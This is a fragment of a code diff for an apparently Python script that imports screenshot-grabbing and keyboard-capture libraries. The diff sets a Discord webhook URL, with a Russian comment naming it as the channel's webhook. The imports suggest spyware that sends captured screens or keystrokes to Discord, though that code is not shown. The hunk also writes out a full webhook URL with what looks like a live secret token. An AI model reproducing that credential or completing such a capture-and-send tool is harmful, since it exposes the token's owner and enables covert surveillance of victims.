@@ -3,7 +3,7 @@ from pyscreenshot import grab
 import keyboard
 
 # Url вебхука канала в Discord
-URL = 'url for webhook'
+URL = 'https://discord.com/api/webhooks/816472418519482389/MMYy7Mm53kg0lCwe2FR0BhraRNNZCgom-wHxEvmpou6Aca0gDxUPQ0rYwK3wKGVKi8mN'
 
 
 def hook():
